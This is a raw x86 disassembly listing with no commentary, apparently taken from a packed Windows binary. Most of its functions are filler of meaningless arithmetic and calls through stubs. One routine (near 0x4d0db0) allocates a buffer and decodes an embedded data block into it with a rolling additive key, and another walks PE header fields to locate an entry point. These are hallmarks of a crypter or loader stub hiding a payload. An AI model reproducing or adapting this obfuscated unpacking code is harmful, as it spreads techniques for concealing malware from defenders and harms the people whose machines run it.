  4d079b:	ret    
  4d079c:	mov    edi,edi
  4d079e:	push   ebp
  4d079f:	mov    ebp,esp
  4d07a1:	sub    esp,0x24
  4d07a4:	lea    eax,[esi-0x16c]
  4d07aa:	mov    ebx,esi
  4d07ac:	push   eax
  4d07ad:	call   0x4d1558
  4d07b2:	add    esp,0x4
  4d07b5:	pop    eax
  4d07b6:	push   eax
  4d07b7:	push   ecx
  4d07b8:	push   DWORD PTR [eax+0x30]
  4d07bb:	call   0x4d09b4
  4d07c0:	add    esp,0x8
  4d07c3:	pop    eax
  4d07c4:	push   eax
  4d07c5:	mov    edi,0x0
  4d07ca:	push   edi
  4d07cb:	call   0x4d11a4
  4d07d0:	add    esp,0x4
  4d07d3:	pop    eax
  4d07d4:	add    esp,0x24
  4d07d7:	pop    ebp
  4d07d8:	ret    
  4d07d9:	add    BYTE PTR [eax],al
  4d07db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07e1:	sub    esp,0x58
  4d07e4:	mov    edx,0x4d31dc
  4d07e9:	add    DWORD PTR [ebp-0x18],0xffffffc6
  4d07ed:	push   edx
  4d07ee:	push   DWORD PTR [edx+0x30]
  4d07f1:	push   DWORD PTR [edx+0x24]
  4d07f4:	push   DWORD PTR [edx+0xf8]
  4d07fa:	push   DWORD PTR [edx+0x1d8]
  4d0800:	call   0x4d0ae0
  4d0805:	add    esp,0x10
  4d0808:	pop    edx
  4d0809:	push   edx
  4d080a:	call   0x4d1570
  4d080f:	add    esp,0x4
  4d0812:	pop    edx
  4d0813:	mov    esi,0x4d2014
  4d0818:	mov    esi,DWORD PTR [esi]
  4d081a:	push   esi
  4d081b:	push   DWORD PTR [edx-0x28]
  4d081e:	pop    eax
  4d081f:	call   eax
  4d0821:	add    esp,0x58
  4d0824:	pop    ebp
  4d0825:	ret    
  4d0826:	add    BYTE PTR [eax],al
  4d0828:	mov    edi,edi
  4d082a:	push   ebp
  4d082b:	mov    ebp,esp
  4d082d:	sub    esp,0x24
  4d0830:	lea    ebx,[edi-0x44]
  4d0833:	or     esi,0xb90
  4d0839:	mov    eax,0x0
  4d083e:	push   eax
  4d083f:	call   0x4d0f6c
  4d0844:	add    esp,0x4
  4d0847:	push   ebx
  4d0848:	push   esi
  4d0849:	push   edi
  4d084a:	push   edx
  4d084b:	call   0x4d0704
  4d0850:	add    esp,0xc
  4d0853:	pop    ebx
  4d0854:	push   0x0
  4d0856:	call   0x4d154c
  4d085b:	add    esp,0x4
  4d085e:	add    esp,0x24
  4d0861:	pop    ebp
  4d0862:	ret    
  4d0863:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0869:	sub    esp,0x28
  4d086c:	lea    ebx,ds:0x4d30f0
  4d0872:	or     ecx,0x3eba
  4d0878:	push   ebx
  4d0879:	push   DWORD PTR [ebx+0xf8]
  4d087f:	push   DWORD PTR [ebx+0xf4]
  4d0885:	call   0x4d0bd0
  4d088a:	add    esp,0x8
  4d088d:	pop    ebx
  4d088e:	call   0x4d1558
  4d0893:	add    esp,0x4
  4d0896:	call   0x4d1588
  4d089b:	add    esp,0x4
  4d089e:	add    esp,0x28
  4d08a1:	pop    ebp
  4d08a2:	ret    
  4d08a3:	add    BYTE PTR [edi-0x1],bl
  4d08a6:	adc    eax,0x4d2058
  4d08ab:	call   edi
  4d08ad:	add    BYTE PTR [eax],al
  4d08af:	add    BYTE PTR [edi-0x1],bl
  4d08b2:	adc    eax,0x4d207c
  4d08b7:	call   edi
  4d08b9:	add    BYTE PTR [eax],al
  4d08bb:	add    BYTE PTR [edi-0x1],bl
  4d08be:	adc    eax,0x4d2040
  4d08c3:	call   edi
  4d08c5:	add    BYTE PTR [eax],al
  4d08c7:	add    BYTE PTR [edi-0x1],bl
  4d08ca:	adc    eax,0x4d2090
  4d08cf:	call   edi
  4d08d1:	add    BYTE PTR [eax],al
  4d08d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08d9:	sub    esp,0x34
  4d08dc:	lea    eax,ds:0x4d319c
  4d08e2:	adc    DWORD PTR [eax-0xc4],esi
  4d08e8:	push   eax
  4d08e9:	push   0x0
  4d08eb:	call   0x4d1060
  4d08f0:	add    esp,0x4
  4d08f3:	pop    eax
  4d08f4:	push   eax
  4d08f5:	push   edx
  4d08f6:	push   DWORD PTR [eax+0x17c]
  4d08fc:	call   0x4d0a9c
  4d0901:	add    esp,0x8
  4d0904:	pop    eax
  4d0905:	push   eax
  4d0906:	mov    edi,0x0
  4d090b:	push   edi
  4d090c:	call   0x4d12dc
  4d0911:	add    esp,0x4
  4d0914:	pop    eax
  4d0915:	add    esp,0x34
  4d0918:	pop    ebp
  4d0919:	ret    
  4d091a:	add    BYTE PTR [eax],al
  4d091c:	mov    edi,edi
  4d091e:	push   ebp
  4d091f:	mov    ebp,esp
  4d0921:	sub    esp,0x60
  4d0924:	lea    edi,ds:0x4d30b0
  4d092a:	sbb    esi,DWORD PTR [edi+0x118]
  4d0930:	push   edi
  4d0931:	push   DWORD PTR [edi]
  4d0933:	push   DWORD PTR [edi+0x150]
  4d0939:	call   0x4d0f78
  4d093e:	add    esp,0x8
  4d0941:	pop    edi
  4d0942:	push   edi
  4d0943:	mov    esi,0x0
  4d0948:	push   esi
  4d0949:	call   0x4d0d04
  4d094e:	add    esp,0x4
  4d0951:	pop    edi
  4d0952:	push   edi
  4d0953:	mov    eax,0x0
  4d0958:	push   eax
  4d0959:	call   0x4d12c4
  4d095e:	add    esp,0x4
  4d0961:	pop    edi
  4d0962:	add    esp,0x60
  4d0965:	pop    ebp
  4d0966:	ret    
  4d0967:	add    BYTE PTR [edi-0x1],bl
  4d096a:	adc    eax,0x4d2018
  4d096f:	call   edi
  4d0971:	add    BYTE PTR [eax],al
  4d0973:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0979:	sub    esp,0x34
  4d097c:	lea    ebx,ds:0x4d30e8
  4d0982:	or     DWORD PTR [ebx+0x68],ebx
  4d0985:	push   ebx
  4d0986:	push   DWORD PTR [ebx+0x30]
  4d0989:	push   DWORD PTR [ebx+0x1ec]
  4d098f:	push   DWORD PTR [ebx+0x15c]
  4d0995:	call   0x4d0e90
  4d099a:	add    esp,0xc
  4d099d:	pop    ebx
  4d099e:	call   0x4d1588
  4d09a3:	add    esp,0x4
  4d09a6:	call   0x4d1570
  4d09ab:	add    esp,0x4
  4d09ae:	add    esp,0x34
  4d09b1:	pop    ebp
  4d09b2:	ret    
  4d09b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09b9:	sub    esp,0x3c
  4d09bc:	lea    esi,[eax+0x17c]
  4d09c2:	cmp    esi,0x2e11
  4d09c8:	je     0x4d09b7
  4d09ca:	call   0x4d1570
  4d09cf:	add    esp,0x4
  4d09d2:	push   esi
  4d09d3:	push   DWORD PTR [esi+0x158]
  4d09d9:	push   DWORD PTR [esi+0x138]
  4d09df:	push   DWORD PTR [esi+0x38]
  4d09e2:	push   DWORD PTR [esi+0x144]
  4d09e8:	call   0x4d0c68
  4d09ed:	add    esp,0x10
  4d09f0:	pop    esi
  4d09f1:	mov    ecx,0x0
  4d09f6:	push   ecx
  4d09f7:	call   0x4d110c
  4d09fc:	add    esp,0x4
  4d09ff:	add    esp,0x3c
  4d0a02:	pop    ebp
  4d0a03:	ret    
  4d0a04:	pop    edi
  4d0a05:	call   DWORD PTR ds:0x4d209c
  4d0a0b:	call   edi
  4d0a0d:	add    BYTE PTR [eax],al
  4d0a0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a15:	sub    esp,0x5c
  4d0a18:	mov    ebx,0x4d30b4
  4d0a1d:	xor    DWORD PTR [ebx-0xb0],ecx
  4d0a23:	mov    edi,0x0
  4d0a28:	push   edi
  4d0a29:	call   0x4d0ed8
  4d0a2e:	add    esp,0x4
  4d0a31:	push   ebx
  4d0a32:	push   edx
  4d0a33:	push   ecx
  4d0a34:	push   DWORD PTR [ebx+0x17c]
  4d0a3a:	call   0x4d1168
  4d0a3f:	add    esp,0xc
  4d0a42:	pop    ebx
  4d0a43:	mov    eax,0x0
  4d0a48:	push   eax
  4d0a49:	call   0x4d154c
  4d0a4e:	add    esp,0x4
  4d0a51:	add    esp,0x5c
  4d0a54:	pop    ebp
  4d0a55:	ret    
  4d0a56:	add    BYTE PTR [eax],al
  4d0a58:	mov    edi,edi
  4d0a5a:	push   ebp
  4d0a5b:	mov    ebp,esp
  4d0a5d:	sub    esp,0x38
  4d0a60:	lea    ecx,[edi-0x18]
  4d0a63:	cmp    ecx,0x77fb
  4d0a69:	jbe    0x4d0a5b
  4d0a6b:	push   ecx
  4d0a6c:	push   0x0
  4d0a6e:	call   0x4d12dc
  4d0a73:	add    esp,0x4
  4d0a76:	pop    ecx
  4d0a77:	push   ecx
  4d0a78:	push   DWORD PTR [ecx+0x40]
  4d0a7b:	push   edx
  4d0a7c:	push   DWORD PTR [ecx+0x1a0]
  4d0a82:	call   0x4d0c20
  4d0a87:	add    esp,0xc
  4d0a8a:	pop    ecx
  4d0a8b:	push   ecx
  4d0a8c:	push   0x0
  4d0a8e:	call   0x4d110c
  4d0a93:	add    esp,0x4
  4d0a96:	pop    ecx
  4d0a97:	add    esp,0x38
  4d0a9a:	pop    ebp
  4d0a9b:	ret    
  4d0a9c:	mov    edi,edi
  4d0a9e:	push   ebp
  4d0a9f:	mov    ebp,esp
  4d0aa1:	sub    esp,0x38
  4d0aa4:	mov    edi,0x4d311c
  4d0aa9:	mov    DWORD PTR [edi+0xdc],edx
  4d0aaf:	push   edi
  4d0ab0:	mov    eax,0x0
  4d0ab5:	push   eax
  4d0ab6:	call   0x4d11a4
  4d0abb:	add    esp,0x4
  4d0abe:	pop    edi
  4d0abf:	push   edi
  4d0ac0:	push   esi
  4d0ac1:	push   DWORD PTR [edi+0x18c]
  4d0ac7:	call   0x4d0fbc
  4d0acc:	add    esp,0x8
  4d0acf:	pop    edi
  4d0ad0:	push   edi
  4d0ad1:	call   0x4d1570
  4d0ad6:	add    esp,0x4
  4d0ad9:	pop    edi
  4d0ada:	add    esp,0x38
  4d0add:	pop    ebp
  4d0ade:	ret    
  4d0adf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae5:	sub    esp,0x28
  4d0ae8:	lea    eax,ds:0x4d3168
  4d0aee:	or     esi,0xffffffc8
  4d0af1:	push   eax
  4d0af2:	push   DWORD PTR [eax+0x180]
  4d0af8:	push   ecx
  4d0af9:	push   DWORD PTR [eax+0x90]
  4d0aff:	push   edi
  4d0b00:	call   0x4d0b28
  4d0b05:	add    esp,0x10
  4d0b08:	pop    eax
  4d0b09:	push   eax
  4d0b0a:	push   0x0
  4d0b0c:	call   0x4d1060
  4d0b11:	add    esp,0x4
  4d0b14:	pop    eax
  4d0b15:	push   eax
  4d0b16:	push   0x0
  4d0b18:	call   0x4d1060
  4d0b1d:	add    esp,0x4
  4d0b20:	pop    eax
  4d0b21:	add    esp,0x28
  4d0b24:	pop    ebp
  4d0b25:	ret    
  4d0b26:	add    BYTE PTR [eax],al
  4d0b28:	mov    edi,edi
  4d0b2a:	push   ebp
  4d0b2b:	mov    ebp,esp
  4d0b2d:	sub    esp,0x30
  4d0b30:	lea    ebx,[eax-0x94]
  4d0b36:	cmp    ebx,0x655c
  4d0b3c:	jb     0x4d0b2b
  4d0b3e:	push   ebx
  4d0b3f:	push   eax
  4d0b40:	push   DWORD PTR [ebx+0x13c]
  4d0b46:	call   0x4d106c
  4d0b4b:	add    esp,0x8
  4d0b4e:	pop    ebx
  4d0b4f:	lea    edx,[ebx-0xd4]
  4d0b55:	push   edx
  4d0b56:	call   0x4d1594
  4d0b5b:	add    esp,0x4
  4d0b5e:	test   eax,eax
  4d0b60:	jne    0x4d0b50
  4d0b62:	push   0x0
  4d0b64:	call   0x4d0ed8
  4d0b69:	add    esp,0x4
  4d0b6c:	add    esp,0x30
  4d0b6f:	pop    ebp
  4d0b70:	ret    
  4d0b71:	add    BYTE PTR [eax],al
  4d0b73:	add    BYTE PTR [edi-0x1],bl
  4d0b76:	adc    eax,0x4d2094
  4d0b7b:	call   edi
  4d0b7d:	add    BYTE PTR [eax],al
  4d0b7f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b85:	sub    esp,0x60
  4d0b88:	mov    edi,0x4d3128
  4d0b8d:	mov    DWORD PTR [edi-0x38],eax
  4d0b90:	push   edi
  4d0b91:	push   DWORD PTR [edi+0x104]
  4d0b97:	push   ecx
  4d0b98:	push   DWORD PTR [edi+0x100]
  4d0b9e:	call   0x4d0d10
  4d0ba3:	add    esp,0xc
  4d0ba6:	pop    edi
  4d0ba7:	push   edi
  4d0ba8:	push   0x0
  4d0baa:	call   0x4d1208
  4d0baf:	add    esp,0x4
  4d0bb2:	pop    edi
  4d0bb3:	push   edi
  4d0bb4:	push   0x0
  4d0bb6:	call   0x4d1060
  4d0bbb:	add    esp,0x4
  4d0bbe:	pop    edi
  4d0bbf:	add    esp,0x60
  4d0bc2:	pop    ebp
  4d0bc3:	ret    
  4d0bc4:	pop    edi
  4d0bc5:	call   DWORD PTR ds:0x4d206c
  4d0bcb:	call   edi
  4d0bcd:	add    BYTE PTR [eax],al
  4d0bcf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd5:	sub    esp,0x30
  4d0bd8:	mov    edx,0x4d3044
  4d0bdd:	adc    DWORD PTR [edx+0x80],0xfffff363
  4d0be7:	push   edx
  4d0be8:	mov    eax,0xfffffff4
  4d0bed:	push   eax
  4d0bee:	call   0x4d15a0
  4d0bf3:	add    esp,0x4
  4d0bf6:	pop    edx
  4d0bf7:	push   edx
  4d0bf8:	push   eax
  4d0bf9:	push   DWORD PTR [edx+0xb8]
  4d0bff:	call   0x4d1124
  4d0c04:	add    esp,0x8
  4d0c07:	pop    edx
  4d0c08:	push   edx
  4d0c09:	mov    edx,0x0
  4d0c0e:	push   edx
  4d0c0f:	call   0x4d0f6c
  4d0c14:	add    esp,0x4
  4d0c17:	pop    edx
  4d0c18:	add    esp,0x30
  4d0c1b:	pop    ebp
  4d0c1c:	ret    
  4d0c1d:	add    BYTE PTR [eax],al
  4d0c1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c25:	sub    esp,0x3c
  4d0c28:	lea    edi,ds:0x4d30c0
  4d0c2e:	adc    ebx,DWORD PTR [edi-0x30]
  4d0c31:	push   edi
  4d0c32:	push   DWORD PTR [edi+0xdc]
  4d0c38:	push   ebx
  4d0c39:	push   DWORD PTR [edi+0xac]
  4d0c3f:	push   DWORD PTR [edi+0x20]
  4d0c42:	call   0x4d08d4
  4d0c47:	add    esp,0x10
  4d0c4a:	pop    edi
  4d0c4b:	push   edi
  4d0c4c:	push   0x0
  4d0c4e:	call   0x4d12c4
  4d0c53:	add    esp,0x4
  4d0c56:	pop    edi
  4d0c57:	push   edi
  4d0c58:	push   0x0
  4d0c5a:	call   0x4d12c4
  4d0c5f:	add    esp,0x4
  4d0c62:	pop    edi
  4d0c63:	add    esp,0x3c
  4d0c66:	pop    ebp
  4d0c67:	ret    
  4d0c68:	mov    edi,edi
  4d0c6a:	push   ebp
  4d0c6b:	mov    ebp,esp
  4d0c6d:	sub    esp,0x38
  4d0c70:	mov    ecx,0x4d3084
  4d0c75:	and    DWORD PTR [ebp-0x10],eax
  4d0c78:	push   ecx
  4d0c79:	push   DWORD PTR [ecx+0x1c0]
  4d0c7f:	push   DWORD PTR [ecx+0x1c4]
  4d0c85:	push   DWORD PTR [ecx+0x1c]
  4d0c88:	push   DWORD PTR [ecx+0x12c]
  4d0c8e:	call   0x4d091c
  4d0c93:	add    esp,0x10
  4d0c96:	pop    ecx
  4d0c97:	push   ecx
  4d0c98:	mov    edi,0x0
  4d0c9d:	push   edi
  4d0c9e:	call   0x4d0d04
  4d0ca3:	add    esp,0x4
  4d0ca6:	pop    ecx
  4d0ca7:	push   ecx
  4d0ca8:	mov    edi,0x0
  4d0cad:	push   edi
  4d0cae:	call   0x4d0d04
  4d0cb3:	add    esp,0x4
  4d0cb6:	pop    ecx
  4d0cb7:	add    esp,0x38
  4d0cba:	pop    ebp
  4d0cbb:	ret    
  4d0cbc:	push   edi
  4d0cbd:	sub    edi,edi
  4d0cbf:	push   edi
  4d0cc0:	push   edi
  4d0cc1:	push   edi
  4d0cc2:	push   edi
  4d0cc3:	call   0x4d1588
  4d0cc8:	sub    esp,0xfffffffc
  4d0ccb:	call   0x4d157c
  4d0cd0:	push   0x2
  4d0cd2:	xor    eax,eax
  4d0cd4:	dec    eax
  4d0cd5:	and    eax,0x4d3030
  4d0cda:	push   0x0
  4d0cdc:	lea    ecx,[eax+0x6]
  4d0cdf:	add    BYTE PTR [ecx],0x41
  4d0ce2:	push   eax
  4d0ce3:	call   0x4d1564
  4d0ce8:	pop    edi
  4d0ce9:	pop    edi
  4d0cea:	pop    edi
  4d0ceb:	lea    edi,[eax+0x3b]
  4d0cee:	mov    edi,DWORD PTR [edi]
  4d0cf0:	lea    eax,[eax+edi*1]
  4d0cf3:	mov    eax,DWORD PTR [eax+0x28]
  4d0cf6:	pusha  
  4d0cf7:	mov    ah,0x45
  4d0cf9:	sub    al,ah
  4d0cfb:	ja     0x4d07dc
  4d0d01:	popa   
  4d0d02:	ret    
  4d0d03:	add    BYTE PTR [edi-0x1],bl
  4d0d06:	adc    eax,0x4d203c
  4d0d0b:	call   edi
  4d0d0d:	add    BYTE PTR [eax],al
  4d0d0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d15:	sub    esp,0x28
  4d0d18:	lea    eax,[edi+0x60]
  4d0d1b:	xor    edx,DWORD PTR [eax-0x144]
  4d0d21:	push   eax
  4d0d22:	push   DWORD PTR [eax+0xe8]
  4d0d28:	push   DWORD PTR [eax+0xc4]
  4d0d2e:	push   DWORD PTR [eax+0x1e4]
  4d0d34:	call   0x4d0a10
  4d0d39:	add    esp,0xc
  4d0d3c:	pop    eax
  4d0d3d:	push   eax
  4d0d3e:	mov    ecx,0x0
  4d0d43:	push   ecx
  4d0d44:	call   0x4d11a4
  4d0d49:	add    esp,0x4
  4d0d4c:	pop    eax
  4d0d4d:	push   eax
  4d0d4e:	lea    edi,[eax-0x188]
  4d0d54:	push   edi
  4d0d55:	call   0x4d1594
  4d0d5a:	add    esp,0x4
  4d0d5d:	test   eax,eax
  4d0d5f:	jne    0x4d0d4e
  4d0d61:	pop    eax
  4d0d62:	add    esp,0x28
  4d0d65:	pop    ebp
  4d0d66:	ret    
  4d0d67:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d6d:	sub    esp,0x1c
  4d0d70:	mov    edi,0x4d3060
  4d0d75:	sbb    DWORD PTR [edi+0x6c],0xffffa09f
  4d0d7c:	push   edi
  4d0d7d:	push   esi
  4d0d7e:	push   esi
  4d0d7f:	call   0x4d0864
  4d0d84:	add    esp,0x8
  4d0d87:	pop    edi
  4d0d88:	push   edi
  4d0d89:	mov    eax,0x0
  4d0d8e:	push   eax
  4d0d8f:	call   0x4d0f6c
  4d0d94:	add    esp,0x4
  4d0d97:	pop    edi
  4d0d98:	push   edi
  4d0d99:	mov    edx,0x0
  4d0d9e:	push   edx
  4d0d9f:	call   0x4d0f6c
  4d0da4:	add    esp,0x4
  4d0da7:	pop    edi
  4d0da8:	add    esp,0x1c
  4d0dab:	pop    ebp
  4d0dac:	ret    
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x1c
  4d0db8:	xor    edi,DWORD PTR [esi-0x64]
  4d0dbb:	lea    edi,ds:0x4d3124
  4d0dc1:	push   edi
  4d0dc2:	mov    eax,0x6ac
  4d0dc7:	push   eax
  4d0dc8:	push   0x6ac
  4d0dcd:	mov    esi,0x40001
  4d0dd2:	push   esi
  4d0dd3:	mov    eax,0x8629857a
  4d0dd8:	push   DWORD PTR [eax+0x7a239a86]
  4d0dde:	sub    DWORD PTR [esp],0x2
  4d0de2:	mov    eax,0x4d2028
  4d0de7:	pop    DWORD PTR [eax]
  4d0de9:	call   0x4d1564
  4d0dee:	add    esp,0x4
  4d0df1:	xchg   DWORD PTR [esp],eax
  4d0df4:	mov    edi,eax
  4d0df6:	pop    DWORD PTR [edi+0x90]
  4d0dfc:	mov    edx,DWORD PTR [edi+0x90]
  4d0e02:	mov    eax,edx
  4d0e04:	sub    ebx,ebx
  4d0e06:	dec    ebx
  4d0e07:	and    ebx,0x4d0014
  4d0e0d:	mov    edx,0xd5d9a824
  4d0e12:	mov    esi,0x6ac
  4d0e17:	xor    ecx,ecx
  4d0e19:	push   DWORD PTR [ebx+ecx*1]
  4d0e1c:	add    DWORD PTR [esp],edx
  4d0e1f:	pop    DWORD PTR [eax+ecx*2]
  4d0e22:	dec    DWORD PTR [eax]
  4d0e24:	xor    edx,edx
  4d0e26:	add    edx,DWORD PTR [ebx]
  4d0e28:	add    ebx,0x4
  4d0e2b:	add    eax,0x4
  4d0e2e:	sub    esi,0x4
  4d0e31:	cmp    esi,0x0
  4d0e34:	jne    0x4d0e17
  4d0e36:	push   edi
  4d0e37:	mov    ebx,0x0
  4d0e3c:	push   ebx
  4d0e3d:	call   0x4d0ed8
  4d0e42:	add    esp,0x4
  4d0e45:	pop    edi
  4d0e46:	add    esp,0x1c
  4d0e49:	pop    ebp
  4d0e4a:	ret    
  4d0e4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e51:	sub    esp,0x54
  4d0e54:	mov    edx,0x4d3164
  4d0e59:	adc    esi,DWORD PTR [ebp-0x34]
  4d0e5c:	push   edx
  4d0e5d:	push   0x0
  4d0e5f:	call   0x4d154c
  4d0e64:	add    esp,0x4
  4d0e67:	pop    edx
  4d0e68:	push   edx
  4d0e69:	push   DWORD PTR [edx+0x100]
  4d0e6f:	push   esi
  4d0e70:	push   DWORD PTR [edx+0x12c]
  4d0e76:	push   ecx
  4d0e77:	call   0x4d12e8
  4d0e7c:	add    esp,0x10
  4d0e7f:	pop    edx
  4d0e80:	push   edx
  4d0e81:	call   0x4d1570
  4d0e86:	add    esp,0x4
  4d0e89:	pop    edx
  4d0e8a:	add    esp,0x54
  4d0e8d:	pop    ebp
  4d0e8e:	ret    
  4d0e8f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e95:	sub    esp,0x30
  4d0e98:	lea    esi,ds:0x4d31ac
  4d0e9e:	mov    DWORD PTR [ebp-0x20],ebx
  4d0ea1:	mov    edi,0x0
  4d0ea6:	push   edi
  4d0ea7:	call   0x4d0d04
  4d0eac:	add    esp,0x4
  4d0eaf:	push   esi
  4d0eb0:	push   edi
  4d0eb1:	push   DWORD PTR [esi+0x10c]
  4d0eb7:	push   DWORD PTR [esi+0x18]
  4d0eba:	push   DWORD PTR [esi+0x9c]
  4d0ec0:	call   0x4d0db0
  4d0ec5:	add    esp,0x10
  4d0ec8:	pop    esi
  4d0ec9:	push   0x0
  4d0ecb:	call   0x4d1208
  4d0ed0:	add    esp,0x4
  4d0ed3:	add    esp,0x30
  4d0ed6:	pop    ebp
  4d0ed7:	ret    
  4d0ed8:	pop    edi
  4d0ed9:	call   DWORD PTR ds:0x4d2038
  4d0edf:	call   edi
  4d0ee1:	add    BYTE PTR [eax],al
  4d0ee3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ee9:	sub    esp,0x4c
  4d0eec:	lea    ecx,[esi-0x19c]
  4d0ef2:	xor    eax,DWORD PTR [ebp-0x20]
  4d0ef5:	push   ecx
  4d0ef6:	call   0x4d1570
  4d0efb:	add    esp,0x4
  4d0efe:	pop    ecx
  4d0eff:	push   ecx
  4d0f00:	push   edx
  4d0f01:	push   eax
  4d0f02:	push   esi
  4d0f03:	call   0x4d141c
  4d0f08:	add    esp,0xc
  4d0f0b:	pop    ecx
  4d0f0c:	push   ecx
  4d0f0d:	push   0x0
  4d0f0f:	call   0x4d1060
  4d0f14:	add    esp,0x4
  4d0f17:	pop    ecx
  4d0f18:	add    esp,0x4c
  4d0f1b:	pop    ebp
  4d0f1c:	ret    
  4d0f1d:	add    BYTE PTR [eax],al
  4d0f1f:	add    BYTE PTR [edi-0x1],bl
  4d0f22:	adc    eax,0x4d2054
  4d0f27:	call   edi
  4d0f29:	add    BYTE PTR [eax],al
  4d0f2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f31:	sub    esp,0x54
  4d0f34:	lea    ecx,[eax-0x5c]
  4d0f37:	and    ebx,esi
  4d0f39:	push   ecx
  4d0f3a:	push   DWORD PTR [ecx+0xe0]
  4d0f40:	push   DWORD PTR [ecx+0x24]
  4d0f43:	push   esi
  4d0f44:	call   0x4d1334
  4d0f49:	add    esp,0xc
  4d0f4c:	pop    ecx
  4d0f4d:	push   ecx
  4d0f4e:	call   0x4d1570
  4d0f53:	add    esp,0x4
  4d0f56:	pop    ecx
  4d0f57:	push   ecx
  4d0f58:	mov    edx,0x0
  4d0f5d:	push   edx
  4d0f5e:	call   0x4d110c
  4d0f63:	add    esp,0x4
  4d0f66:	pop    ecx
  4d0f67:	add    esp,0x54
  4d0f6a:	pop    ebp
  4d0f6b:	ret    
  4d0f6c:	pop    edi
  4d0f6d:	call   DWORD PTR ds:0x4d2004
  4d0f73:	call   edi
  4d0f75:	add    BYTE PTR [eax],al
  4d0f77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f7d:	sub    esp,0x3c
  4d0f80:	mov    esi,0x4d317c
  4d0f85:	xor    eax,DWORD PTR [esi-0x34]
  4d0f88:	mov    ebx,0x0
  4d0f8d:	push   ebx
  4d0f8e:	call   0x4d12c4
  4d0f93:	add    esp,0x4
  4d0f96:	push   esi
  4d0f97:	push   DWORD PTR [esi+0x124]
  4d0f9d:	push   DWORD PTR [esi+0x148]
  4d0fa3:	call   0x4d13cc
  4d0fa8:	add    esp,0x8
  4d0fab:	pop    esi
  4d0fac:	call   0x4d1558
  4d0fb1:	add    esp,0x4
  4d0fb4:	add    esp,0x3c
  4d0fb7:	pop    ebp
  4d0fb8:	ret    
  4d0fb9:	add    BYTE PTR [eax],al
  4d0fbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc1:	sub    esp,0x3c
  4d0fc4:	mov    edx,0x4d31b0
  4d0fc9:	cmp    edx,0x783a
  4d0fcf:	jbe    0x4d0fbf
  4d0fd1:	push   edx
  4d0fd2:	push   DWORD PTR [edx+0x150]
  4d0fd8:	push   DWORD PTR [edx+0x7c]
  4d0fdb:	push   DWORD PTR [edx+0x44]
  4d0fde:	push   esi
  4d0fdf:	call   0x4d075c
  4d0fe4:	add    esp,0x10
  4d0fe7:	pop    edx
  4d0fe8:	push   edx
  4d0fe9:	push   0x0
  4d0feb:	call   0x4d11a4
  4d0ff0:	add    esp,0x4
  4d0ff3:	pop    edx
  4d0ff4:	push   edx
  4d0ff5:	push   0x0
  4d0ff7:	call   0x4d0ed8
  4d0ffc:	add    esp,0x4
  4d0fff:	pop    edx
  4d1000:	add    esp,0x3c
  4d1003:	pop    ebp
  4d1004:	ret    
  4d1005:	add    BYTE PTR [eax],al
  4d1007:	add    BYTE PTR [edi-0x1],bl
  4d100a:	adc    eax,0x4d205c
  4d100f:	call   edi
  4d1011:	add    BYTE PTR [eax],al
  4d1013:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1019:	sub    esp,0x58
  4d101c:	lea    esi,ds:0x4d31e8
  4d1022:	or     DWORD PTR [esi-0x4c],0xffffda83
  4d1029:	push   0x0
  4d102b:	call   0x4d12dc
  4d1030:	add    esp,0x4
  4d1033:	push   esi
  4d1034:	push   ecx
  4d1035:	push   DWORD PTR [esi+0x168]
  4d103b:	push   DWORD PTR [esi+0x160]
  4d1041:	call   0x4d0ee4
  4d1046:	add    esp,0xc
  4d1049:	pop    esi
  4d104a:	mov    ecx,0xfffffff4
  4d104f:	push   ecx
  4d1050:	call   0x4d15a0
  4d1055:	add    esp,0x4
  4d1058:	add    esp,0x58
  4d105b:	pop    ebp
  4d105c:	ret    
  4d105d:	add    BYTE PTR [eax],al
  4d105f:	add    BYTE PTR [edi-0x1],bl
  4d1062:	adc    eax,0x4d204c
  4d1067:	call   edi
  4d1069:	add    BYTE PTR [eax],al
  4d106b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1071:	sub    esp,0x4c
  4d1074:	lea    eax,ds:0x4d31a0
  4d107a:	or     esi,eax
  4d107c:	push   eax
  4d107d:	push   ecx
  4d107e:	push   edi
  4d107f:	push   ebx
  4d1080:	push   DWORD PTR [eax+0x128]
  4d1086:	call   0x4d0f2c
  4d108b:	add    esp,0x10
  4d108e:	pop    eax
  4d108f:	push   eax
  4d1090:	lea    esi,[eax-0x1a0]
  4d1096:	push   esi
  4d1097:	call   0x4d1594
  4d109c:	add    esp,0x4
  4d109f:	test   eax,eax
  4d10a1:	jne    0x4d1090
  4d10a3:	pop    eax
  4d10a4:	push   eax
  4d10a5:	push   0x0
  4d10a7:	call   0x4d11a4
  4d10ac:	add    esp,0x4
  4d10af:	pop    eax
  4d10b0:	add    esp,0x4c
  4d10b3:	pop    ebp
  4d10b4:	ret    
  4d10b5:	add    BYTE PTR [eax],al
  4d10b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10bd:	sub    esp,0x40
  4d10c0:	lea    edi,ds:0x4d300c
  4d10c6:	sbb    DWORD PTR [edi+0x13c],esi
  4d10cc:	push   edi
  4d10cd:	push   DWORD PTR [edi+0xa8]
  4d10d3:	push   DWORD PTR [edi+0x1e4]
  4d10d9:	push   eax
  4d10da:	push   edx
  4d10db:	call   0x4d1274
  4d10e0:	add    esp,0x10
  4d10e3:	pop    edi
  4d10e4:	push   edi
  4d10e5:	mov    ebx,0x0
  4d10ea:	push   ebx
  4d10eb:	call   0x4d12c4
